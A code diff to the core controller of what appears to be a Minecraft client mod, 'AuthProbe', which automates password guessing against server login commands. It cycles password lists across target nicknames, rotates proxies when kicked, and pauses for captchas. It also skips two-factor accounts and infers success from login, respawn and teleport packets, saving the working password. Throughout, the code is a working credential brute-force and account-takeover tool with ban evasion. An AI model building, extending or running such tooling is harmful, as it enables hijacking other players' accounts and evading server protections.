@@ -9,6 +9,7 @@ import net.minecraft.network.chat.Component;
 import net.minecraft.network.chat.MutableComponent;
 import ru.an0n.authprobe.proxy.ProxyEntry;
 import ru.an0n.authprobe.proxy.ProxyTunnel;
+import ru.an0n.authprobe.screen.BotStatusScreen;
 import ru.an0n.authprobe.utils.Nicks;
 
 import java.util.List;
@@ -95,6 +96,11 @@ public final class BotController {
     private static int sentCount;
 
     /**
+     * Sends spent on the current nickname.
+     */
+    private static int nickSentCount;
+
+    /**
      * Last password put on the wire.
      */
     private static String lastPassword = "";
@@ -161,13 +167,21 @@ public final class BotController {
     private static long switchAt;
 
     /**
-     * Substrings that mean the nickname itself was rejected (invalid name, already online).
-     * Editable in the patterns screen, so a server with unusual wording needs no rebuild.
+     * Reasons that mean the nickname is already online somewhere. Editable in the patterns screen.
      *
-     * @return Nickname kick reasons
+     * @return Busy-nickname reasons
      */
-    private static List<String> nickKicks() {
-        return ProbeConfig.INSTANCE.nickKicks();
+    private static List<String> nickOnline() {
+        return ProbeConfig.INSTANCE.nickOnline();
+    }
+
+    /**
+     * Reasons that mean the server rejected the name itself. Editable in the patterns screen.
+     *
+     * @return Invalid-nickname reasons
+     */
+    private static List<String> nickInvalid() {
+        return ProbeConfig.INSTANCE.nickInvalid();
     }
 
     /**
@@ -181,17 +195,36 @@ public final class BotController {
     }
 
     /**
-     * Words that mark a nickname the server will never accept, as opposed to one that is
-     * merely busy right now.
-     */
-    private static final List<String> PERMANENT_NICK_KICKS = List.of(
-            "invalid", "bad nickname", "illegal nickname", "неверн", "неправильн", "недопустим"
-    );
-
-    /**
      * How many times the same password may be re-sent after a server-requested pause.
      */
     private static final int MAX_PAUSE_RETRIES = 3;
+
+    /**
+     * How long the probe waits after joining before the first send when the captcha check is on.
+     */
+    private static final long CAPTCHA_SETTLE_MS = 750L;
+
+    /**
+     * Time the current password was sent, used to cap repeated holds.
+     */
+    private static long attemptStartedAt;
+
+    /**
+     * Whether the hold line was already printed for the current attempt.
+     */
+    private static boolean holdAnnounced;
+
+    /**
+     * Whether the server said it is checking the password during the current attempt. Any
+     * transfer-like packet after such a hold means the password was accepted.
+     */
+    private static boolean holdSeen;
+
+    /**
+     * Set from a packet hook when a success signal arrived. Applied on the client tick, because
+     * the packet handlers run on the network thread before they switch to the main thread.
+     */
+    private static volatile boolean packetSuccess;
 
     /**
      * Pause retries already spent on the current password.
@@ -202,6 +235,38 @@ public final class BotController {
      * Server pauses waited out in this run, for the kick report.
      */
     private static int pauseCount;
+
+    /**
+     * Whether a password was already sent for the current nickname. A 2FA or captcha notice
+     * seen before that point must not spend a try.
+     */
+    private static boolean nickSent;
+
+    /**
+     * Whether the pending nickname switch should wait for {@code .start} after joining.
+     */
+    private static boolean switchWaitForStart = true;
+
+    /**
+     * Whether the run is paused on a captcha prompt.
+     */
+    private static boolean captchaPaused;
+
+    /**
+     * Whether the pattern warnings were already printed in this session.
+     */
+    private static boolean patternWarningsShown;
+
+    /**
+     * Whether the next join should skip the debug nickname header: the nickname switch line
+     * already named the nick.
+     */
+    private static boolean skipNextNickHeader;
+
+    /**
+     * Whether the "2FA before .start is off" notice was already printed for this nickname.
+     */
+    private static boolean droppedTwoFactorShown;
 
     /**
      * Classification of the last disconnect, for the kick screen:
@@ -280,6 +345,15 @@ public final class BotController {
     }
 
     /**
+     * Gets the sends spent on the current nickname.
+     *
+     * @return Nickname send count
+     */
+    public static int nickSentCount() {
+        return nickSentCount;
+    }
+
+    /**
      * Gets the last password put on the wire.
      *
      * @return Last password, empty if none
@@ -339,7 +413,7 @@ public final class BotController {
                 passwordIndex + 1,
                 config.passwordCount(),
                 password,
-                sentCount);
+                nickSentCount);
     }
 
     /**
@@ -433,6 +507,7 @@ public final class BotController {
         proxyRotationBlocked = false;
         if (!resume) {
             passwordIndex = 0;
+            nickSentCount = 0;
             lastPassword = "";
             kickReason = "";
             reconnectCount = 0;
@@ -443,10 +518,14 @@ public final class BotController {
         autoResume = false;
         sendSpent = false;
         pauseRetries = 0;
+        nickSent = false;
+        captchaPaused = false;
+        droppedTwoFactorShown = false;
         begun = true;
         ChatWatcher.arm();
         state = State.WAIT_SEND;
-        nextSendAt = 0L;
+        nextSendAt = System.currentTimeMillis()
+                + (config.captchaBeforeStart() ? CAPTCHA_SETTLE_MS : 0L);
         announce(resume ? "resume at " + describePosition() : "start. " + config.passwordCount() + " passwords");
     }
 
@@ -464,7 +543,8 @@ public final class BotController {
         ChatWatcher.disarm();
 
         if (passwordIndex >= config.passwordCount()) {
-            if (hasUsableNextTarget()) {
+            if (hasUsableNextTarget() && config.autoSwap()) {
+                switchWaitForStart = true;
                 switchPending = true;
                 switchAt = System.currentTimeMillis();
                 state = State.DISCONNECTED;
@@ -616,17 +696,50 @@ public final class BotController {
             return;
         }
 
+        // Two-factor and captcha signals are handled before the state machine: 2FA can arrive
+        // before .start, and a captcha must stop the first send of the nickname.
+        if (armed() && state != State.CONNECTING) {
+            String twoFactorRule = ChatWatcher.takeTwoFactorRule();
+            if (!twoFactorRule.isEmpty()) {
+                boolean beforeStart = state == State.ARMED || (state == State.WAIT_SEND && !nickSent);
+                if (!beforeStart || ProbeConfig.INSTANCE.twoFactorBeforeStart()) {
+                    handleTwoFactor(twoFactorRule);
+                    return;
+                }
+                notifyDroppedTwoFactor(twoFactorRule);
+            }
+            String captchaRule = ChatWatcher.takeCaptchaRule();
+            if (!captchaRule.isEmpty() && !nickSent) {
+                pauseForCaptcha(captchaRule);
+                return;
+            }
+        }
+
         switch (state) {
             case CONNECTING -> {
                 // Joined.
                 if (minecraft.getConnection() != null && minecraft.player != null) {
                     state = State.ARMED;
+                    nickSent = false;
+                    captchaPaused = false;
+                    droppedTwoFactorShown = false;
 
                     // The nickname is reachable again, so the skip mark has served its purpose.
                     ProbeConfig joined = ProbeConfig.INSTANCE;
                     if (joined.clearSkip(joined.activeIndex())) joined.saveIfDirty();
 
-                    announceNickHeader();
+                    // A hand-edited config is checked once per session, on the first join.
+                    if (!patternWarningsShown) {
+                        patternWarningsShown = true;
+                        for (String warning : joined.patternWarnings()) {
+                            warn(Component.literal(warning));
+                        }
+                    }
+
+                    if (!skipNextNickHeader) {
+                        announceNickHeader();
+                    }
+                    skipNextNickHeader = false;
                     AuthProbe.logger().info("AuthProbe: joined as nick #{} '{}'.",
                             ProbeConfig.INSTANCE.activeIndex() + 1, ProbeConfig.INSTANCE.nick());
 
@@ -637,7 +750,7 @@ public final class BotController {
                         autoResume = false;
                         ChatWatcher.disarm();
                         state = State.ARMED;
-                        announce("joined. type .start or .go to continue at " + describePosition());
+                        announce("joined. type .start or .go to continue");
                     } else if (!begun && ProbeConfig.INSTANCE.autoStart()) {
                         begin();
                     } else if (autoResume || (begun && ProbeConfig.INSTANCE.autoStart())) {
@@ -645,7 +758,7 @@ public final class BotController {
                         continueAfterJoin();
                     } else {
                         announce(begun
-                                ? "joined. type .start or .go to continue at " + describePosition()
+                                ? "joined. type .start or .go to continue"
                                 : "joined. type .start or .go to begin");
                     }
                 }
@@ -654,6 +767,11 @@ public final class BotController {
                 if (System.currentTimeMillis() >= nextSendAt) sendAttempt(minecraft);
             }
             case SENT -> {
+                if (packetSuccess) {
+                    packetSuccess = false;
+                    succeed();
+                    return;
+                }
                 ChatWatcher.Verdict verdict = ChatWatcher.verdict();
                 if (verdict == ChatWatcher.Verdict.SUCCESS) {
                     ChatWatcher.consume();
@@ -665,9 +783,9 @@ public final class BotController {
                     handlePause(minecraft);
                     return;
                 }
-                if (verdict == ChatWatcher.Verdict.TWO_FACTOR) {
+                if (verdict == ChatWatcher.Verdict.HOLD) {
                     ChatWatcher.consume();
-                    handleTwoFactor();
+                    handleHold(minecraft);
                     return;
                 }
                 if (verdict == ChatWatcher.Verdict.FAIL || verdict == ChatWatcher.Verdict.KICK) {
@@ -676,10 +794,12 @@ public final class BotController {
                     scheduleNext(minecraft);
                     return;
                 }
-                // No answer inside the timeout counts as a spent attempt.
-                if (System.currentTimeMillis() - sentAt > ProbeConfig.INSTANCE.timeoutMs()) {
-                    advance();
-                    scheduleNext(minecraft);
+                // No answer inside the timeout counts as a spent attempt. A hold is different:
+                // the short timeout is ignored and only the hold limit may spend the password.
+                ProbeConfig config = ProbeConfig.INSTANCE;
+                if (ProbeTiming.answerExpired(holdSeen, System.currentTimeMillis(), sentAt,
+                        attemptStartedAt, config.timeoutMs(), config.holdLimitMs())) {
+                    expireAttempt(minecraft, holdSeen);
                 }
             }
             case DISCONNECTED -> {
@@ -747,8 +867,15 @@ public final class BotController {
             AuthProbe.logger().error("AuthProbe: unable to send login command.", t);
         }
         sentCount++;
+        nickSentCount++;
         sentAt = System.currentTimeMillis();
+        attemptStartedAt = sentAt;
+        holdAnnounced = false;
+        holdSeen = false;
+        packetSuccess = false;
         sendSpent = true;
+        nickSent = true;
+        captchaPaused = false;
         state = State.SENT;
         AuthProbe.logger().info("AuthProbe: sent {} | {} of {}", config.mode().display(), passwordIndex + 1, config.passwordCount());
         if (config.debugLogs()) {
@@ -764,7 +891,7 @@ public final class BotController {
      */
     private static void announcePassword(String password) {
         ProbeConfig config = ProbeConfig.INSTANCE;
-        Component line = Component.literal(PREFIX + "nick ")
+        Component line = Component.literal("nick ")
                 .append(Component.literal("#" + (config.activeIndex() + 1) + "/" + config.targets().size())
                         .withStyle(ChatFormatting.AQUA))
                 .append(Component.literal(" · password "))
@@ -772,7 +899,7 @@ public final class BotController {
                         .withStyle(ChatFormatting.AQUA))
                 .append(Component.literal(": "))
                 .append(Component.literal("<" + password + ">").withStyle(ChatFormatting.YELLOW));
-        announce(line);
+        announce(line, ChatWatcher.COLOR_TRY);
     }
 
     /**
@@ -781,12 +908,12 @@ public final class BotController {
     private static void announceNickHeader() {
         ProbeConfig config = ProbeConfig.INSTANCE;
         if (!config.debugLogs()) return;
-        Component line = Component.literal(PREFIX + "nick ")
+        Component line = Component.literal("nick ")
                 .append(Component.literal("#" + (config.activeIndex() + 1) + "/" + config.targets().size())
                         .withStyle(ChatFormatting.AQUA))
                 .append(Component.literal(": "))
                 .append(Component.literal(config.nick()).withStyle(ChatFormatting.YELLOW));
-        announce(line);
+        announce(line, ChatWatcher.COLOR_NICK);
     }
 
     /**
@@ -826,6 +953,72 @@ public final class BotController {
     }
 
     /**
+     * Handles a server that is still checking the password. Nothing is sent and the attempt is
+     * not spent: the short answer timeout is ignored, and only the configured hold limit may
+     * spend the password.
+     *
+     * @param minecraft Minecraft instance
+     */
+    private static void handleHold(Minecraft minecraft) {
+        long now = System.currentTimeMillis();
+        holdSeen = true;
+        if (ProbeTiming.answerExpired(true, now, sentAt, attemptStartedAt,
+                ProbeConfig.INSTANCE.timeoutMs(), ProbeConfig.INSTANCE.holdLimitMs())) {
+            expireAttempt(minecraft, true);
+            return;
+        }
+        if (holdAnnounced) return;
+        holdAnnounced = true;
+        announce(Component.literal("сервер проверяет пароль — ждём ответ"), ChatWatcher.COLOR_WARN);
+    }
+
+    /**
+     * Spends the current password after the answer wait ran out.
+     *
+     * @param minecraft Minecraft instance
+     * @param hold      Whether a server-side hold was seen during the attempt
+     */
+    private static void expireAttempt(Minecraft minecraft, boolean hold) {
+        if (hold) {
+            announce(Component.literal("удержание истекло (" + ProbeConfig.INSTANCE.holdLimitMs() / 1000L
+                    + " с) — пароль списан"), ChatWatcher.COLOR_WARN);
+        }
+        advance();
+        scheduleNext(minecraft);
+    }
+
+    /**
+     * Warns once per nickname that a two-factor line was seen before {@code .start} while the
+     * pre-start check is off.
+     *
+     * @param rule Matched phrase
+     */
+    private static void notifyDroppedTwoFactor(String rule) {
+        if (droppedTwoFactorShown) return;
+        droppedTwoFactorShown = true;
+        warn(Component.literal("2FA замечено («" + rule + "»), но 2FA до .start выключено — строка проигнорирована"));
+    }
+
+    /**
+     * Announces a warning in chat and shows it as a toast.
+     *
+     * @param message Message
+     */
+    public static void warn(Component message) {
+        announce(message, ChatWatcher.COLOR_WARN);
+        notify(message);
+    }
+
+    /**
+     * Announces a warning in chat and shows it as a toast.
+     *
+     * @param message Message
+     */
+    public static void warn(String message) {
+        warn(Component.literal(message));
+    }
+
+    /**
      * Announces the pause and the password that will be re-sent.
      *
      * @param wait Pause, milliseconds
@@ -835,13 +1028,13 @@ public final class BotController {
         String seconds = wait % 1000L == 0L
                 ? Long.toString(wait / 1000L)
                 : String.format(java.util.Locale.ROOT, "%.1f", wait / 1000.0D);
-        Component line = Component.literal(PREFIX + "сервер просит паузу ")
+        Component line = Component.literal("сервер просит паузу ")
                 .append(Component.literal(seconds + " с").withStyle(ChatFormatting.AQUA))
                 .append(Component.literal(" — повтор пароля "))
                 .append(Component.literal("#" + (passwordIndex + 1) + "/" + config.passwordCount())
                         .withStyle(ChatFormatting.AQUA))
                 .append(Component.literal(" (" + pauseRetries + "/" + MAX_PAUSE_RETRIES + ")"));
-        announce(line);
+        announce(line, ChatWatcher.COLOR_WARN);
     }
 
     /**
@@ -868,6 +1061,47 @@ public final class BotController {
     }
 
     /**
+     * Called when the client receives a login packet. If a password was just sent, the server
+     * accepted it and is moving the player into the world. Limbo servers that transfer the
+     * player after auth never write success in chat, so this packet is the only signal.
+     */
+    public static void onLoginPacket() {
+        if (state != State.SENT || lastPassword.isEmpty()) return;
+        packetSuccess = true;
+        AuthProbe.logger().info("AuthProbe: login packet after a sent password, treating it as success.");
+    }
+
+    /**
+     * Called when the client receives a respawn packet, which is how a limbo server moves the
+     * player into the lobby after a correct password without writing anything in chat.
+     */
+    public static void onRespawnPacket() {
+        if (state != State.SENT || lastPassword.isEmpty()) return;
+        packetSuccess = true;
+        AuthProbe.logger().info("AuthProbe: respawn after a sent password, treating it as success.");
+    }
+
+    /**
+     * Called on a plugin-channel payload. Servers with a lobby plugin send their data right after
+     * the login is accepted, so a payload that follows a password check is a success signal.
+     */
+    public static void onCustomPayload() {
+        if (state != State.SENT || !holdSeen || lastPassword.isEmpty()) return;
+        packetSuccess = true;
+        AuthProbe.logger().info("AuthProbe: custom payload after a password check, treating it as success.");
+    }
+
+    /**
+     * Called on a player position packet. Limbo servers teleport the player into the lobby after
+     * a correct password, and that teleport follows the password check.
+     */
+    public static void onPlayerPosition() {
+        if (state != State.SENT || !holdSeen || lastPassword.isEmpty()) return;
+        packetSuccess = true;
+        AuthProbe.logger().info("AuthProbe: teleport after a password check, treating it as success.");
+    }
+
+    /**
      * Announces the accepted password and stops.
      */
     private static void succeed() {
@@ -881,7 +1115,13 @@ public final class BotController {
                 .append(Component.literal(lastPassword).withStyle(ChatFormatting.GREEN))
                 .append(Component.literal(" (password #" + (passwordIndex + 1) + " of "
                         + config.passwordCount() + ", " + sentCount + " sends total)"));
-        announce(message);
+
+        // Keep only the password that worked, so the profile shows the result at a glance.
+        config.primary(config.primary()
+                .withPasswords(List.of(lastPassword))
+                .withoutSkip()
+                .withResult(ProbeTarget.RESULT_FOUND));
+        announce(message, ChatWatcher.COLOR_FOUND);
         notify(message);
         config.save();
     }
@@ -890,6 +1130,9 @@ public final class BotController {
      * Announces that every password was spent.
      */
     private static void exhausted() {
+        ProbeConfig config = ProbeConfig.INSTANCE;
+        config.markResult(config.activeIndex(), ProbeTarget.RESULT_EXHAUSTED);
+
         if (proxyRotationBlocked) {
             state = State.DISCONNECTED;
             begun = false;
@@ -901,6 +1144,12 @@ public final class BotController {
             return;
         }
         if (hasUsableNextTarget()) {
+            if (!config.autoSwap()) {
+                stopForManualSwitch("авто-смена выключена");
+                return;
+            }
+            // Same rule as a nickname kick: with auto-start on, the next nick continues by itself.
+            switchWaitForStart = !config.autoStart();
             switchPending = true;
             switchAt = System.currentTimeMillis();
             state = State.DISCONNECTED;
@@ -921,6 +1170,49 @@ public final class BotController {
         announce(message);
         notify(message);
         ProbeConfig.INSTANCE.save();
+
+        // No nickname is left: leave the server so the results screen replaces the game.
+        kickReason = "";
+        kickClass = "";
+        disconnectToResults();
+    }
+
+    /**
+     * Closes the session after the last nickname failed. The vanilla disconnect screen is
+     * swapped for the AuthProbe report by the screen handler, which accepts the exhausted state.
+     */
+    private static void disconnectToResults() {
+        Minecraft minecraft = Minecraft.getInstance();
+        if (minecraft == null) return;
+        ClientPacketListener connection = minecraft.getConnection();
+        if (connection == null) return;
+        AuthProbe.logger().info("AuthProbe: every password was spent, disconnecting to the report.");
+
+        // Drop the level first: the disconnect mixin then leaves the vanilla screen alone and
+        // the report is opened here, on the client thread.
+        minecraft.clearLevel();
+        connection.getConnection().disconnect(Component.literal("AuthProbe: every password was spent"));
+        minecraft.setScreen(new BotStatusScreen());
+    }
+
+    /**
+     * Stops the run instead of switching to the next nickname. Used when automatic switching is
+     * off: the operator picks the next profile in the menu.
+     *
+     * @param reason Reason shown in chat
+     */
+    private static void stopForManualSwitch(String reason) {
+        state = State.DISCONNECTED;
+        begun = false;
+        sendSpent = false;
+        switchPending = false;
+        ChatWatcher.disarm();
+        reconnectPending = false;
+        announce(reason + " — выбери следующий ник в меню");
+        Minecraft minecraft = Minecraft.getInstance();
+        if (minecraft != null && minecraft.getConnection() != null) {
+            disconnectToResults();
+        }
     }
 
     /**
@@ -956,16 +1248,21 @@ public final class BotController {
 
         config.activeIndex(next);
         passwordIndex = 0;
+        nickSentCount = 0;
         lastPassword = "";
         sendSpent = false;
         pauseRetries = 0;
+        nickSent = false;
+        captchaPaused = false;
+        droppedTwoFactorShown = false;
         begun = true;
         autoResume = false;
-        waitForStart = true;
+        waitForStart = switchWaitForStart;
+        switchWaitForStart = true;
         reconnectPending = false;
         ChatWatcher.disarm();
         SessionSwap.toOffline(config.nick());
-        announce("next nick: " + config.nick() + ", next password: " + config.passwords().get(0));
+        announceNickChange();
 
         // The nickname is part of the login handshake, so the old session has to go.
         Minecraft minecraft = Minecraft.getInstance();
@@ -996,18 +1293,19 @@ public final class BotController {
      * @return Whether the nickname itself was rejected
      */
     private static boolean isNickKick(String reason) {
-        return reason != null && !reason.isBlank() && PatternBank.matches(nickKicks(), reason);
+        if (reason == null || reason.isBlank()) return false;
+        return PatternBank.matches(nickOnline(), reason) || PatternBank.matches(nickInvalid(), reason);
     }
 
     /**
-     * Checks whether a nickname kick is permanent. The server will reject the name again, so
-     * the mark says so instead of inviting a retry hours later.
+     * Checks whether a nickname kick is permanent. The server rejected the name itself, so the
+     * mark says so instead of inviting a retry hours later.
      *
      * @param reason Kick reason
      * @return Whether the nickname itself is invalid
      */
     private static boolean isPermanentNickKick(String reason) {
-        return reason != null && PatternBank.matches(PERMANENT_NICK_KICKS, reason);
+        return reason != null && PatternBank.matches(nickInvalid(), reason);
     }
 
     /**
@@ -1019,10 +1317,16 @@ public final class BotController {
         kickClass = "";
         if (reason == null || reason.isBlank()) return;
 
-        String nickRule = PatternBank.matchesAny(nickKicks(), reason);
-        if (!nickRule.isEmpty()) {
-            kickClass = isPermanentNickKick(reason) ? "nick-invalid" : "nick-online";
-            AuthProbe.logger().info("AuthProbe: kick classified as {} by '{}'.", kickClass, nickRule);
+        String invalidRule = PatternBank.matchesAny(nickInvalid(), reason);
+        if (!invalidRule.isEmpty()) {
+            kickClass = "nick-invalid";
+            AuthProbe.logger().info("AuthProbe: kick classified as nick-invalid by '{}'.", invalidRule);
+            return;
+        }
+        String onlineRule = PatternBank.matchesAny(nickOnline(), reason);
+        if (!onlineRule.isEmpty()) {
+            kickClass = "nick-online";
+            AuthProbe.logger().info("AuthProbe: kick classified as nick-online by '{}'.", onlineRule);
             return;
         }
         String proxyRule = PatternBank.matchesAny(proxyKicks(), reason);
@@ -1082,11 +1386,11 @@ public final class BotController {
             switchPending = false;
             state = State.DISCONNECTED;
             ChatWatcher.disarm();
-            Component stopped = Component.literal(PREFIX + "прокси закончились (№")
+            Component stopped = Component.literal("прокси закончились (№")
                     .append(Component.literal(String.valueOf(config.proxyIndex() + 1)).withStyle(ChatFormatting.AQUA))
                     .append(Component.literal("/" + config.proxies().size()
                             + "). Авто-реконнект остановлен. Нажми «Сменить прокси» для нового круга."));
-            announce(stopped);
+            announce(stopped, ChatWatcher.COLOR_ERROR);
             notify(stopped);
             ProbeConfig.INSTANCE.saveIfDirty();
             return false;
@@ -1105,12 +1409,26 @@ public final class BotController {
         ProbeConfig config = ProbeConfig.INSTANCE;
         ProxyEntry entry = ProxyEntry.parse(config.currentProxyLine());
         String display = entry == null ? "?" : entry.display();
-        Component message = Component.literal(PREFIX + "Прокси: №" + (config.proxyIndex() + 1)
+        Component message = Component.literal("Прокси: №" + (config.proxyIndex() + 1)
                         + "/" + config.proxies().size())
                 .withStyle(ChatFormatting.AQUA)
                 .append(Component.literal(" " + display).withStyle(ChatFormatting.YELLOW));
-        announce(message);
+        announce(message, ChatWatcher.COLOR_PROXY);
         notify(message);
+    }
+
+    /**
+     * Announces the nickname the probe just switched to, in local chat and a toast.
+     */
+    private static void announceNickChange() {
+        ProbeConfig config = ProbeConfig.INSTANCE;
+        Component message = Component.literal("Ник: №" + (config.activeIndex() + 1)
+                        + "/" + config.targets().size())
+                .withStyle(ChatFormatting.AQUA)
+                .append(Component.literal(" " + config.nick()).withStyle(ChatFormatting.YELLOW));
+        announce(message, ChatWatcher.COLOR_NICK);
+        notify(message);
+        skipNextNickHeader = true;
     }
 
     /**
@@ -1122,7 +1440,7 @@ public final class BotController {
      */
     private static void abandonNick(String reason) {
         abandonNick(reason, isPermanentNickKick(reason)
-                ? ProbeTarget.KIND_INVALID : ProbeTarget.KIND_ONLINE);
+                ? ProbeTarget.KIND_INVALID : ProbeTarget.KIND_ONLINE, "");
     }
 
     /**
@@ -1131,8 +1449,9 @@ public final class BotController {
      * @param reason Kick reason
      * @param kind   {@link ProbeTarget#KIND_ONLINE}, {@link ProbeTarget#KIND_INVALID}
      *               or {@link ProbeTarget#KIND_2FA}
+     * @param rule   Phrase that triggered the mark, empty when not applicable
      */
-    private static void abandonNick(String reason, String kind) {
+    private static void abandonNick(String reason, String kind, String rule) {
         ProbeConfig config = ProbeConfig.INSTANCE;
         skippedTarget = config.activeIndex();
         skippedReason = reason == null ? "" : reason;
@@ -1142,11 +1461,15 @@ public final class BotController {
         sendSpent = false;
         pauseRetries = 0;
 
+        // With auto-start on, a nickname switch continues by itself: the operator asked the probe
+        // to keep going. With auto-start off it waits for .start, like any manual switch.
+        switchWaitForStart = !config.autoStart();
+
         // Persist the mark: the nickname keeps its password list and waits for a manual retry.
         config.markSkip(skippedTarget, skippedReason, System.currentTimeMillis(), kind);
         config.save();
 
-        MutableComponent line = Component.literal(PREFIX + "nick ")
+        MutableComponent line = Component.literal("nick ")
                 .append(Component.literal("#" + (skippedTarget + 1) + "/" + config.targets().size())
                         .withStyle(ChatFormatting.AQUA))
                 .append(Component.literal(" ("))
@@ -1154,14 +1477,21 @@ public final class BotController {
                 .append(Component.literal(") "));
         if (ProbeTarget.KIND_2FA.equals(kind)) {
             line = line.append(Component.literal("2FA").withStyle(ChatFormatting.RED));
+            if (rule != null && !rule.isBlank()) {
+                line = line.append(Component.literal(" · «" + rule + "»").withStyle(ChatFormatting.DARK_GRAY));
+            }
         } else {
             String text = skippedReason.isEmpty() ? "nickname rejected" : skippedReason;
             line = line.append(Component.literal("skipped: "))
                     .append(Component.literal(text).withStyle(ChatFormatting.RED));
         }
-        announce(line);
+        announce(line, ChatWatcher.COLOR_ERROR);
 
         if (hasUsableNextTarget()) {
+            if (!config.autoSwap()) {
+                stopForManualSwitch("авто-смена выключена");
+                return;
+            }
             switchPending = true;
             switchAt = System.currentTimeMillis();
             state = State.DISCONNECTED;
@@ -1179,12 +1509,45 @@ public final class BotController {
     /**
      * Marks the current nickname as a two-factor account and moves on. The password may well
      * have been correct: the server asks for a confirmation that only the operator can give.
+     *
+     * @param rule Phrase that triggered the detection
      */
-    private static void handleTwoFactor() {
+    private static void handleTwoFactor(String rule) {
         ProbeConfig config = ProbeConfig.INSTANCE;
-        AuthProbe.logger().warn("AuthProbe: 2FA required for nick #{} '{}', last password: {}",
-                config.activeIndex() + 1, config.nick(), lastPassword);
-        abandonNick("2FA", ProbeTarget.KIND_2FA);
+        AuthProbe.logger().warn("AuthProbe: 2FA for nick #{} '{}' by '{}', last password: {}",
+                config.activeIndex() + 1, config.nick(), rule, lastPassword);
+        abandonNick("2FA", ProbeTarget.KIND_2FA, rule);
+    }
+
+    /**
+     * Marks the current nickname as a two-factor account on operator request and moves on.
+     */
+    public static void markTwoFactor() {
+        if (!armed()) {
+            announce("2fa: прогон не идёт");
+            return;
+        }
+        handleTwoFactor("вручную");
+    }
+
+    /**
+     * Stops sending until the operator passes the captcha and types {@code .start}.
+     *
+     * @param rule Phrase that triggered the pause
+     */
+    private static void pauseForCaptcha(String rule) {
+        if (captchaPaused) {
+            state = State.ARMED;
+            return;
+        }
+        captchaPaused = true;
+        state = State.ARMED;
+        ChatWatcher.disarm();
+        MutableComponent line = Component.literal("капча — пройди проверку и нажми .start / .go");
+        if (rule != null && !rule.isBlank()) {
+            line = line.append(Component.literal(" · «" + rule + "»").withStyle(ChatFormatting.DARK_GRAY));
+        }
+        warn(line);
     }
 
     /**
@@ -1254,11 +1617,21 @@ public final class BotController {
     private static void reset() {
         passwordIndex = 0;
         sentCount = 0;
+        nickSentCount = 0;
         lastPassword = "";
         kickReason = "";
         pauseRetries = 0;
         pauseCount = 0;
         kickClass = "";
+        nickSent = false;
+        captchaPaused = false;
+        switchWaitForStart = true;
+        droppedTwoFactorShown = false;
+        skipNextNickHeader = false;
+        attemptStartedAt = 0L;
+        holdAnnounced = false;
+        holdSeen = false;
+        packetSuccess = false;
         reconnectPending = false;
         reconnectCount = 0;
         autoResume = false;
@@ -1279,11 +1652,7 @@ public final class BotController {
      * @param message Message
      */
     public static void announce(String message) {
-        AuthProbe.logger().info("AuthProbe: {}", message);
-        mirrorLocal(PREFIX + message);
-        Minecraft minecraft = Minecraft.getInstance();
-        if (minecraft == null || minecraft.player == null) return;
-        minecraft.player.displayClientMessage(Component.literal(PREFIX + message), false);
+        announce(Component.literal(message), ChatWatcher.COLOR_INFO);
     }
 
     /**
@@ -1292,8 +1661,18 @@ public final class BotController {
      * @param message Message
      */
     public static void announce(Component message) {
+        announce(message, ChatWatcher.COLOR_INFO);
+    }
+
+    /**
+     * Sends a styled status line with an explicit pane colour.
+     *
+     * @param message Message
+     * @param color   Colour used for the local copy in the chat pane
+     */
+    public static void announce(Component message, int color) {
         AuthProbe.logger().info("AuthProbe: {}", message.getString());
-        mirrorLocal(PREFIX + message.getString());
+        mirrorLocal(PREFIX + message.getString(), color);
         Minecraft minecraft = Minecraft.getInstance();
         if (minecraft == null || minecraft.player == null) return;
         minecraft.player.displayClientMessage(Component.literal(PREFIX).append(message), false);
@@ -1303,11 +1682,12 @@ public final class BotController {
      * Mirrors a local line into the chat pane while debug logs are on, so the pane shows the
      * same trail the in-game chat does.
      *
-     * @param text Full line, prefix included
+     * @param text  Full line, prefix included
+     * @param color Line colour in the pane
      */
-    private static void mirrorLocal(String text) {
+    private static void mirrorLocal(String text, int color) {
         if (!ProbeConfig.INSTANCE.debugLogs()) return;
-        ChatWatcher.local(text);
+        ChatWatcher.local(text, color);
     }
 
     /**
@@ -1324,7 +1704,7 @@ public final class BotController {
      *
      * @param message Message
      */
-    private static void notify(Component message) {
+    public static void notify(Component message) {
         Minecraft minecraft = Minecraft.getInstance();
         if (minecraft == null) return;
         SystemToast.add(minecraft.getToasts(), SystemToast.SystemToastIds.PERIODIC_NOTIFICATION,
